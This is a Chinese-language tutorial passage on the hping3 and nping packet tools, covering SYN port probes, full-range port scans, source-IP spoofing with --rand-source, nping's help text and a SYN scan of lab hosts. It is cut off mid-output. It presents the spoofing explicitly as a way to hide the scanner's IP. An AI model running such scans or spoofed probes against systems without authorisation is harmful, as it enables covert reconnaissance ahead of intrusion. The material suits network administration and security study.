<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">&gt; hping3  -I eth0 -S -p 3306 192.168.1.110 -c 2<br>HPING 192.168.1.110 (eth0 192.168.1.110): S set, 40 headers + 0 data bytes<br><span class="hljs-attribute">len</span>=46 <span class="hljs-attribute">ip</span>=192.168.1.110 <span class="hljs-attribute">ttl</span>=64 DF <span class="hljs-attribute">id</span>=0 <span class="hljs-attribute">sport</span>=3306 <span class="hljs-attribute">flags</span>=SA <span class="hljs-attribute">seq</span>=0 <span class="hljs-attribute">win</span>=29200 <span class="hljs-attribute">rtt</span>=31.8 ms<br><span class="hljs-attribute">len</span>=46 <span class="hljs-attribute">ip</span>=192.168.1.110 <span class="hljs-attribute">ttl</span>=64 DF <span class="hljs-attribute">id</span>=0 <span class="hljs-attribute">sport</span>=3306 <span class="hljs-attribute">flags</span>=SA <span class="hljs-attribute">seq</span>=1 <span class="hljs-attribute">win</span>=29200 <span class="hljs-attribute">rtt</span>=7.7 ms<br>--- 192.168.1.110 hping statistic ---<br>2 packets transmitted, 2 packets received, 0% packet loss<br>round-trip min/avg/max = 7.7/19.7/31.8 ms<br><br></code></pre></div></td></tr></table></figure>
<p>注意其中的 <strong>win=29200</strong> 表示开放该端口</p>
<h4 id="scan模式"><a class="markdownIt-Anchor" href="#scan模式"></a> Scan模式</h4>
<p>通过 -8/–scan 来开启扫描模式。<br />
所谓扫描模式，通过一个端口组，对主机进行端口扫描。<br />
hping3 给出了两个关键字代表多个端口。</p>
<table>
<thead>
<tr>
<th>关键字</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>all</td>
<td>表示 0-65535 的端口</td>
</tr>
<tr>
<td>known</td>
<td>表示已知本地端口，这些端口位于/etc/services文件</td>
</tr>
</tbody>
</table>
<p>例1，扫描 0-65535 的端口</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">&gt; hping3 --scan <span class="hljs-emphasis">&#x27;all&#x27;</span> -S 192.168.1.110<br>Scanning 192.168.1.110 (192.168.1.110), port all<br><span class="hljs-section">65536 ports to scan, use -V to see all the replies</span><br><span class="hljs-section">+----+-----------+---------+---+-----+-----+-----+</span><br><span class="hljs-section">|port| serv name |  flags  |ttl| id  | win | len |</span><br><span class="hljs-section">+----+-----------+---------+---+-----+-----+-----+</span><br><span class="hljs-code"> 3306 mysql      : .S..A...  64     0 29200    46</span><br><span class="hljs-code">   80 http       : .S..A...  64     0 29200    46</span><br>All replies received. Done.<br>Not responding ports: (1 tcpmux) (2 nbp) (3 ) (4 echo) (6 zip) (8 ) (9 discard) (10 ) (11 systat) (13 daytime) (14 ) <br><span class="hljs-code">......</span><br><span class="hljs-code">......</span><br></code></pre></div></td></tr></table></figure>
<p>例2，扫描 1-5555的端口和已知端口</p>
<figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap">&gt; hping3 -8 &#x27;1-5555,known&#x27; -S 192.168.1.17<br>Scanning 192.168.1.17 (192.168.1.17), port 1-5555,known<br>5641 ports to scan, use -V to see all the replies<br>+----+-----------+---------+---+-----+-----+-----+<br>|port| serv name |  flags  |ttl| id  | win | len |<br>+----+-----------+---------+---+-----+-----+-----+<br>  <span class="hljs-number"> 21 </span>ftp        : .S..A... <span class="hljs-number"> 64 </span>   <span class="hljs-number"> 0 </span><span class="hljs-number"> 5840 </span>   44<br>  <span class="hljs-number"> 22 </span>ssh        : .S..A... <span class="hljs-number"> 64 </span>   <span class="hljs-number"> 0 </span><span class="hljs-number"> 5840 </span>   44<br>  <span class="hljs-number"> 23 </span>telnet     : .S..A... <span class="hljs-number"> 64 </span>   <span class="hljs-number"> 0 </span><span class="hljs-number"> 5840 </span>   44<br>  <span class="hljs-number"> 25 </span>smtp       : .S..A... <span class="hljs-number"> 64 </span>   <span class="hljs-number"> 0 </span><span class="hljs-number"> 5840 </span>   44<br>  <span class="hljs-number"> 53 </span>domain     : .S..A... <span class="hljs-number"> 64 </span>   <span class="hljs-number"> 0 </span><span class="hljs-number"> 5840 </span>   44<br>  <span class="hljs-number"> 80 </span>http       : .S..A... <span class="hljs-number"> 64 </span>   <span class="hljs-number"> 0 </span><span class="hljs-number"> 5840 </span>   44<br> <span class="hljs-number"> 111 </span>sunrpc     : .S..A... <span class="hljs-number"> 64 </span>   <span class="hljs-number"> 0 </span><span class="hljs-number"> 5840 </span>   44<br> <span class="hljs-number"> 139 </span>netbios-ssn: .S..A... <span class="hljs-number"> 64 </span>   <span class="hljs-number"> 0 </span><span class="hljs-number"> 5840 </span>   44<br> <span class="hljs-number"> 445 </span>microsoft-d: .S..A... <span class="hljs-number"> 64 </span>   <span class="hljs-number"> 0 </span><span class="hljs-number"> 5840 </span>   44<br> <span class="hljs-number"> 512 </span>exec       : .S..A... <span class="hljs-number"> 64 </span>   <span class="hljs-number"> 0 </span><span class="hljs-number"> 5840 </span>   44<br> <span class="hljs-number"> 513 </span>login      : .S..A... <span class="hljs-number"> 64 </span>   <span class="hljs-number"> 0 </span><span class="hljs-number"> 5840 </span>   44<br> <span class="hljs-number"> 514 </span>shell      : .S..A... <span class="hljs-number"> 64 </span>   <span class="hljs-number"> 0 </span><span class="hljs-number"> 5840 </span>   44<br><span class="hljs-number"> 1099 </span>rmiregistry: .S..A... <span class="hljs-number"> 64 </span>   <span class="hljs-number"> 0 </span><span class="hljs-number"> 5840 </span>   44<br><span class="hljs-number"> 1524 </span>ingreslock : .S..A... <span class="hljs-number"> 64 </span>   <span class="hljs-number"> 0 </span><span class="hljs-number"> 5840 </span>   44<br><span class="hljs-number"> 2049 </span>nfs        : .S..A... <span class="hljs-number"> 64 </span>   <span class="hljs-number"> 0 </span><span class="hljs-number"> 5840 </span>   44<br><span class="hljs-number"> 2121 </span>iprop      : .S..A... <span class="hljs-number"> 64 </span>   <span class="hljs-number"> 0 </span><span class="hljs-number"> 5840 </span>   44<br><span class="hljs-number"> 3306 </span>mysql      : .S..A... <span class="hljs-number"> 64 </span>   <span class="hljs-number"> 0 </span><span class="hljs-number"> 5840 </span>   44<br><span class="hljs-number"> 3632 </span>distcc     : .S..A... <span class="hljs-number"> 64 </span>   <span class="hljs-number"> 0 </span><span class="hljs-number"> 5840 </span>   44<br><span class="hljs-number"> 5432 </span>postgresql : .S..A... <span class="hljs-number"> 64 </span>   <span class="hljs-number"> 0 </span><span class="hljs-number"> 5840 </span>   44<br><span class="hljs-number"> 6000 </span>x11        : .S..A... <span class="hljs-number"> 64 </span>   <span class="hljs-number"> 0 </span><span class="hljs-number"> 5840 </span>   44<br><span class="hljs-number"> 6667 </span>ircd       : .S..A... <span class="hljs-number"> 64 </span>   <span class="hljs-number"> 0 </span><span class="hljs-number"> 5840 </span>   44<br><span class="hljs-number"> 6697 </span>ircs-u     : .S..A... <span class="hljs-number"> 64 </span>   <span class="hljs-number"> 0 </span><span class="hljs-number"> 5840 </span>   44<br>All replies received. Done.<br>Not responding ports:<br></code></pre></div></td></tr></table></figure>
<h4 id="发送随机原ip地址的数据包"><a class="markdownIt-Anchor" href="#发送随机原ip地址的数据包"></a> 发送随机原IP地址的数据包</h4>
<p>–rand-source/–rand-dest 用于伪造原/目的IP地址，这可以在很大程度上不让我们自己的IP地址被对方检测到</p>
<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">&gt; hping3 --udp -S 192.168.1.17 -c 5 --rand-source<br>HPING 192.168.1.17 (eth0 192.168.1.17): udp mode set, 28 headers + 0 data bytes<br>ICMP<span class="hljs-built_in"> Port </span>Unreachable <span class="hljs-keyword">from</span> <span class="hljs-attribute">ip</span>=192.168.1.17 <span class="hljs-attribute">name</span>=192.168.1.17<br><span class="hljs-attribute">status</span>=0 <span class="hljs-attribute">port</span>=2475 <span class="hljs-attribute">seq</span>=0<br>ICMP<span class="hljs-built_in"> Port </span>Unreachable <span class="hljs-keyword">from</span> <span class="hljs-attribute">ip</span>=192.168.1.17 <span class="hljs-attribute">name</span>=192.168.1.17<br><span class="hljs-attribute">status</span>=0 <span class="hljs-attribute">port</span>=2476 <span class="hljs-attribute">seq</span>=1<br>ICMP<span class="hljs-built_in"> Port </span>Unreachable <span class="hljs-keyword">from</span> <span class="hljs-attribute">ip</span>=192.168.1.17 <span class="hljs-attribute">name</span>=192.168.1.17<br><span class="hljs-attribute">status</span>=0 <span class="hljs-attribute">port</span>=2477 <span class="hljs-attribute">seq</span>=2<br>ICMP<span class="hljs-built_in"> Port </span>Unreachable <span class="hljs-keyword">from</span> <span class="hljs-attribute">ip</span>=192.168.1.17 <span class="hljs-attribute">name</span>=192.168.1.17<br><span class="hljs-attribute">status</span>=0 <span class="hljs-attribute">port</span>=2478 <span class="hljs-attribute">seq</span>=3<br>--- 192.168.1.17 hping statistic ---<br>5 packets transmitted, 4 packets received, 20% packet loss<br>round-trip min/avg/max = 3.5/4.1/5.8 ms<br></code></pre></div></td></tr></table></figure>
<p>然而这个的问题是丢包率增大。</p>
<p>可以在目主机上执行 <code>tcpdump -nn -v -t udp</code> 来查看收发包情况。</p>
<h3 id="nping"><a class="markdownIt-Anchor" href="#nping"></a> nping</h3>
<p>nping是 <a href="https://nmap.org">Nmap</a> 的一个 网络数据包生成工具。支持 <strong>TCP、UDP、ICMP、ARP</strong> 协议，多个主机的多个端口。功能类似与hping3</p>
<figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">Nping 0.7.60 ( https:<span class="hljs-comment">//nmap.org/nping )</span><br>Usage: nping [Probe mode] [Options] &#123;target specification&#125;<br>TARGET SPECIFICATION:<br>  Targets may be specified <span class="hljs-keyword">as</span> hostnames, IP addresses, networks, etc.<br>  <span class="hljs-keyword">Ex</span>: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.*.1-24<br>PROBE MODES:<br>  --tcp-connect                    : Unprivileged TCP connect probe mode.<br>  --tcp                            : TCP probe mode.<br>  --udp                            : UDP probe mode.<br>  --icmp                           : ICMP probe mode.<br>  --arp                            : ARP/RARP probe mode.<br>  --tr, --traceroute               : Traceroute mode (can only be used with <br>                                     TCP/UDP/ICMP modes).<br>TCP CONNECT MODE:<br>   -p, --dest-port &lt;port spec&gt;     : <span class="hljs-keyword">Set</span> destination port(s).<br>   -<span class="hljs-keyword">g</span>, --source-port &lt;portnumber&gt;  : Try to <span class="hljs-keyword">use</span> a custom source port.<br>TCP PROBE MODE:<br>   -<span class="hljs-keyword">g</span>, --source-port &lt;portnumber&gt;  : <span class="hljs-keyword">Set</span> source port.<br>   -p, --dest-port &lt;port spec&gt;     : <span class="hljs-keyword">Set</span> destination port(s).<br>   --seq &lt;seqnumber&gt;               : <span class="hljs-keyword">Set</span> sequence number.<br>   --flags &lt;flag <span class="hljs-keyword">list</span>&gt;             : <span class="hljs-keyword">Set</span> TCP flags (ACK,PSH,RST,SYN,FIN...)<br>   --ack &lt;acknumber&gt;               : <span class="hljs-keyword">Set</span> ACK number.<br>   --<span class="hljs-keyword">win</span> &lt;size&gt;                    : <span class="hljs-keyword">Set</span> <span class="hljs-keyword">window</span> size.<br>   --badsum                        : <span class="hljs-keyword">Use</span> a random invalid <span class="hljs-keyword">checksum</span>. <br>UDP PROBE MODE:<br>   -<span class="hljs-keyword">g</span>, --source-port &lt;portnumber&gt;  : <span class="hljs-keyword">Set</span> source port.<br>   -p, --dest-port &lt;port spec&gt;     : <span class="hljs-keyword">Set</span> destination port(s).<br>   --badsum                        : <span class="hljs-keyword">Use</span> a random invalid <span class="hljs-keyword">checksum</span>. <br>ICMP PROBE MODE:<br>  --icmp-<span class="hljs-keyword">type</span> &lt;<span class="hljs-keyword">type</span>&gt;               : ICMP <span class="hljs-keyword">type</span>.<br>  --icmp-code &lt;code&gt;               : ICMP code.<br>  --icmp-id &lt;id&gt;                   : <span class="hljs-keyword">Set</span> identifier.<br>  --icmp-seq &lt;<span class="hljs-keyword">n</span>&gt;                   : <span class="hljs-keyword">Set</span> sequence number.<br>  --icmp-redirect-addr &lt;addr&gt;      : <span class="hljs-keyword">Set</span> redirect address.<br>  --icmp-param-pointer &lt;pnt&gt;       : <span class="hljs-keyword">Set</span> parameter problem pointer.<br>  --icmp-advert-lifetime &lt;time&gt;    : <span class="hljs-keyword">Set</span> router advertisement lifetime.<br>  --icmp-advert-entry &lt;IP,pref&gt;    : Add router advertisement entry.<br>  --icmp-orig-time  &lt;timestamp&gt;    : <span class="hljs-keyword">Set</span> originate timestamp.<br>  --icmp-recv-time  &lt;timestamp&gt;    : <span class="hljs-keyword">Set</span> receive timestamp.<br>  --icmp-trans-time &lt;timestamp&gt;    : <span class="hljs-keyword">Set</span> transmit timestamp.<br>ARP/RARP PROBE MODE:<br>  --arp-<span class="hljs-keyword">type</span> &lt;<span class="hljs-keyword">type</span>&gt;                : <span class="hljs-keyword">Type</span>: ARP, ARP-reply, RARP, RARP-reply.<br>  --arp-sender-<span class="hljs-keyword">mac</span> &lt;<span class="hljs-keyword">mac</span>&gt;           : <span class="hljs-keyword">Set</span> sender <span class="hljs-keyword">MAC</span> address.<br>  --arp-sender-ip  &lt;addr&gt;          : <span class="hljs-keyword">Set</span> sender IP address.<br>  --arp-target-<span class="hljs-keyword">mac</span> &lt;<span class="hljs-keyword">mac</span>&gt;           : <span class="hljs-keyword">Set</span> target <span class="hljs-keyword">MAC</span> address.<br>  --arp-target-ip  &lt;addr&gt;          : <span class="hljs-keyword">Set</span> target IP address.<br>IPv4 OPTIONS:<br>  -S, --source-ip                  : <span class="hljs-keyword">Set</span> source IP address.<br>  --dest-ip &lt;addr&gt;                 : <span class="hljs-keyword">Set</span> destination IP address (used <span class="hljs-keyword">as</span> <span class="hljs-keyword">an</span> <br>                                     alternative to &#123;target specification&#125; ). <br>  --tos &lt;tos&gt;                      : <span class="hljs-keyword">Set</span> <span class="hljs-keyword">type</span> of service field (8bits).<br>  --id  &lt;id&gt;                       : <span class="hljs-keyword">Set</span> identification field (16 bits).<br>  --df                             : <span class="hljs-keyword">Set</span> Don&#x27;t Fragment flag.<br>  --mf                             : <span class="hljs-keyword">Set</span> <span class="hljs-keyword">More</span> Fragments flag.<br>  --ttl &lt;hops&gt;                     : <span class="hljs-keyword">Set</span> time to live [0-255].<br>  --badsum-ip                      : <span class="hljs-keyword">Use</span> a random invalid <span class="hljs-keyword">checksum</span>. <br>  --ip-options &lt;S|R [route]|<span class="hljs-keyword">L</span> [route]|T|<span class="hljs-keyword">U</span> ...&gt; : <span class="hljs-keyword">Set</span> IP options<br>  --ip-options &lt;hex string&gt;                    : <span class="hljs-keyword">Set</span> IP options<br>  --mtu &lt;size&gt;                     : <span class="hljs-keyword">Set</span> MTU. Packets get fragmented <span class="hljs-keyword">if</span> MTU is<br>                                     small enough.<br>IPv6 OPTIONS:<br>  -6, --IPv6                       : <span class="hljs-keyword">Use</span> IP <span class="hljs-keyword">version</span> 6.<br>  --dest-ip                        : <span class="hljs-keyword">Set</span> destination IP address (used <span class="hljs-keyword">as</span> <span class="hljs-keyword">an</span><br>                                     alternative to &#123;target specification&#125;).<br>  --hop-limit                      : <span class="hljs-keyword">Set</span> hop limit (same <span class="hljs-keyword">as</span> IPv4 TTL).<br>  --traffic-<span class="hljs-keyword">class</span> &lt;<span class="hljs-keyword">class</span>&gt; :        : <span class="hljs-keyword">Set</span> traffic <span class="hljs-keyword">class</span>.<br>  --flow &lt;<span class="hljs-keyword">label</span>&gt;                   : <span class="hljs-keyword">Set</span> flow <span class="hljs-keyword">label</span>.<br>ETHERNET OPTIONS:<br>  --dest-<span class="hljs-keyword">mac</span> &lt;<span class="hljs-keyword">mac</span>&gt;                 : <span class="hljs-keyword">Set</span> destination <span class="hljs-keyword">mac</span> address. (Disables<br>                                     ARP resolution)<br>  --source-<span class="hljs-keyword">mac</span> &lt;<span class="hljs-keyword">mac</span>&gt;               : <span class="hljs-keyword">Set</span> source <span class="hljs-keyword">MAC</span> address.<br>  --ether-<span class="hljs-keyword">type</span> &lt;<span class="hljs-keyword">type</span>&gt;              : <span class="hljs-keyword">Set</span> EtherType value.<br>PAYLOAD OPTIONS:<br>  --data &lt;hex string&gt;              : <span class="hljs-keyword">Include</span> a custom payload.<br>  --data-string &lt;text&gt;             : <span class="hljs-keyword">Include</span> a custom ASCII text.<br>  --data-length &lt;len&gt;              : <span class="hljs-keyword">Include</span> len random bytes <span class="hljs-keyword">as</span> payload.<br>ECHO CLIENT/SERVER:<br>  --echo-client &lt;passphrase&gt;       : <span class="hljs-keyword">Run</span> Nping <span class="hljs-keyword">in</span> client mode.<br>  --echo-server &lt;passphrase&gt;       : <span class="hljs-keyword">Run</span> Nping <span class="hljs-keyword">in</span> server mode.<br>  --echo-port &lt;port&gt;               : <span class="hljs-keyword">Use</span> custom &lt;port&gt; to listen or connect.<br>  --<span class="hljs-keyword">no</span>-crypto                      : Disable encryption and authentication.<br>  --once                           : Stop the server after <span class="hljs-keyword">one</span> connection.<br>  --safe-payloads                  : <span class="hljs-keyword">Erase</span> application data <span class="hljs-keyword">in</span> echoed packets.<br>TIMING AND PERFORMANCE:<br>  Options <span class="hljs-keyword">which</span> take &lt;time&gt; are <span class="hljs-keyword">in</span> seconds, or <span class="hljs-keyword">append</span> &#x27;ms&#x27; (milliseconds),<br>  &#x27;s&#x27; (seconds), &#x27;<span class="hljs-keyword">m</span>&#x27; (minutes), or &#x27;<span class="hljs-keyword">h</span>&#x27; (hours) to the value (<span class="hljs-keyword">e</span>.<span class="hljs-keyword">g</span>. 30m, 0.25h).<br>  --delay &lt;time&gt;                   : <span class="hljs-keyword">Adjust</span> delay between probes.<br>  --rate  &lt;rate&gt;                   : Send num packets per second.<br>MISC:<br>  -<span class="hljs-keyword">h</span>, --<span class="hljs-keyword">help</span>                       : <span class="hljs-keyword">Display</span> <span class="hljs-keyword">help</span> information.<br>  -V, --<span class="hljs-keyword">version</span>                    : <span class="hljs-keyword">Display</span> current <span class="hljs-keyword">version</span> number. <br>  -c, --<span class="hljs-keyword">count</span> &lt;<span class="hljs-keyword">n</span>&gt;                  : Stop after &lt;<span class="hljs-keyword">n</span>&gt; rounds.<br>  -<span class="hljs-keyword">e</span>, --interface &lt;name&gt;           : <span class="hljs-keyword">Use</span> supplied network interface.<br>  -<span class="hljs-keyword">H</span>, --hide-sent                  : <span class="hljs-keyword">Do</span> not <span class="hljs-keyword">display</span> sent packets.<br>  -<span class="hljs-keyword">N</span>, --<span class="hljs-keyword">no</span>-<span class="hljs-keyword">capture</span>                 : <span class="hljs-keyword">Do</span> not try to <span class="hljs-keyword">capture</span> replies.<br>  --privileged                     : Assume user is fully privileged.<br>  --unprivileged                   : Assume user lacks raw socket privileges.<br>  --send-eth                       : Send packets at the raw Ethernet layer.<br>  --send-ip                        : Send packets using raw IP sockets.<br>  --bpf-filter &lt;filter spec&gt;       : Specify custom BPF filter.<br>OUTPUT:<br>  -v                               : Increment verbosity level <span class="hljs-keyword">by</span> <span class="hljs-keyword">one</span>.<br>  -v[level]                        : <span class="hljs-keyword">Set</span> verbosity level. <span class="hljs-keyword">E</span>.<span class="hljs-keyword">g</span>: -v4<br>  -<span class="hljs-keyword">d</span>                               : Increment debugging level <span class="hljs-keyword">by</span> <span class="hljs-keyword">one</span>.<br>  -<span class="hljs-keyword">d</span>[level]                        : <span class="hljs-keyword">Set</span> debugging level. <span class="hljs-keyword">E</span>.<span class="hljs-keyword">g</span>: -d3<br>  -q                               : Decrease verbosity level <span class="hljs-keyword">by</span> <span class="hljs-keyword">one</span>.<br>  -q[<span class="hljs-keyword">N</span>]                            : Decrease verbosity level <span class="hljs-keyword">N</span> times<br>  --quiet                          : <span class="hljs-keyword">Set</span> verbosity and debug level to minimum.<br>  --debug                          : <span class="hljs-keyword">Set</span> verbosity and debug to the max level.<br>EXAMPLES:<br>  nping scanme.nmap.org<br>  nping --tcp -p 80 --flags rst --ttl 2 192.168.1.1<br>  nping --icmp --icmp-<span class="hljs-keyword">type</span> time --delay 500ms 192.168.254.254<br>  nping --echo-server <span class="hljs-string">&quot;public&quot;</span> -<span class="hljs-keyword">e</span> wlan0 -vvv <br>  nping --echo-client <span class="hljs-string">&quot;public&quot;</span> echo.nmap.org --tcp -p1-1024 --flags ack<br>SEE THE <span class="hljs-keyword">MAN</span> PAGE <span class="hljs-keyword">FOR</span> MANY <span class="hljs-keyword">MORE</span> OPTIONS, DESCRIPTIONS, AND EXAMPLES<br></code></pre></div></td></tr></table></figure>
<h4 id="tcp扫描"><a class="markdownIt-Anchor" href="#tcp扫描"></a> TCP扫描</h4>
<figure class="highlight nix"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nix">&gt; nping  --tcp -c <span class="hljs-number">1</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.110</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.108</span> -p <span class="hljs-number">22</span>,<span class="hljs-number">3306</span> <span class="hljs-attr">--flags=syn</span><br>Starting Nping <span class="hljs-number">0.7</span>.<span class="hljs-number">60</span> ( https://nmap.org/nping ) at <span class="hljs-number">2018</span>-<span class="hljs-number">04</span>-<span class="hljs-number">05</span> <span class="hljs-number">11</span>:<span class="hljs-number">08</span> CST<br>SENT (<span class="hljs-number">0.0428</span>s) TCP <span class="hljs-number">192.168</span>.<span class="hljs-number">1.108</span>:<span class="hljs-number">39046</span> &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">1.110</span>:<span class="hljs-number">22</span> S <span class="hljs-attr">ttl=64</span> <span class="hljs-attr">id=19287</span> <span class="hljs-attr">iplen=40</span>  <span class="hljs-attr">seq=1799430370</span> <span class="hljs-attr">win=1480</span> <br>RCVD (<span class="hljs-number">0.0465</span>s) TCP <span class="hljs-number">192.168</span>.<span class="hljs-number">1.110</span>:<span class="hljs-number">22</span> &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">1.108</span>:<span class="hljs-number">39046</span> SA <span class="hljs-attr">ttl=64</span> <span class="hljs-attr">id=0</span> <span class="hljs-attr">iplen=44</span>  <span class="hljs-attr">seq=2225990095</span> <span class="hljs-attr">win=29200</span> &lt;mss <span class="hljs-number">1460</span>&gt;<br>SENT (<span class="hljs-number">1.0437</span>s) TCP <span class="hljs-number">192.168</span>.<span class="hljs-number">1.108</span>:<span class="hljs-number">39046</span> &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">1.108</span>:<span class="hljs-number">22</span> S <span class="hljs-attr">ttl=64</span> <span class="hljs-attr">id=19287</span> <span class="hljs-attr">iplen=40</span>  <span class="hljs-attr">seq=1799430370</span> <span class="hljs-attr">win=1480</span> <br>SENT (<span class="hljs-number">2.0449</span>s) TCP <span class="hljs-number">192.168</span>.<span class="hljs-number">1.108</span>:<span class="hljs-number">39046</span> &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">1.110</span>:<span class="hljs-number">3306</span> S <span class="hljs-attr">ttl=64</span> <span class="hljs-attr">id=19287</span> <span class="hljs-attr">iplen=40</span>  <span class="hljs-attr">seq=1799430370</span> <span class="hljs-attr">win=1480</span> <br>RCVD (<span class="hljs-number">2.0897</span>s) TCP <span class="hljs-number">192.168</span>.<span class="hljs-number">1.110</span>:<span class="hljs-number">3306</span> &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">1.108</span>:<span class="hljs-number">39046</span> SA <span class="hljs-attr">ttl=64</span> <span class="hljs-attr">id=0</span> <span class="hljs-attr">iplen=44</span>  <span class="hljs-attr">seq=3017639874</span> <span class="hljs-attr">win=29200</span> &lt;mss <span class="hljs-number">1460</span>&gt;<br>SENT (<span class="hljs-number">3.0468</span>s) TCP <span class="hljs-number">192.168</span>.<span class="hljs-number">1.108</span>:<span class="hljs-number">39046</span> &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">1.108</span>:<span class="hljs-number">3306</span> S <span class="hljs-attr">ttl=64</span> <span class="hljs-attr">id=19287</span> <span class="hljs-attr">iplen=40</span>  <span class="hljs-attr">seq=1799430370</span> <span class="hljs-attr">win=1480</span> <br> <br>Statistics for host <span class="hljs-number">192.168</span>.<span class="hljs-number">1.110</span>:<br> |  Probes Sent: <span class="hljs-number">2</span> | Rcvd: <span class="hljs-number">2</span> | Lost: <span class="hljs-number">0</span>  (<span class="hljs-number">0.00</span>%)<br> |_ Max rtt: <span class="hljs-number">44.817</span>ms | Min rtt: <span class="hljs-number">3.653</span>ms | Avg rtt: <span class="hljs-number">24.235</span>ms<br>Statistics for host <span class="hljs-number">192.168</span>.<span class="hljs-number">1.108</span>:<br> |  Probes Sent: <span class="hljs-number">2</span> | Rcvd: <span class="hljs-number">0</span> | Lost: <span class="hljs-number">2</span>  (<span class="hljs-number">100.00</span>%)<br> |_ Max rtt: N/A | Min rtt: N/A | Avg rtt: N/A<br>Raw packets sent: <span class="hljs-number">4</span> (<span class="hljs-number">160</span>B) | Rcvd: <span class="hljs-number">2</span> (<span class="hljs-number">92</span>B) | Lost: <span class="hljs-number">2</span> (<span 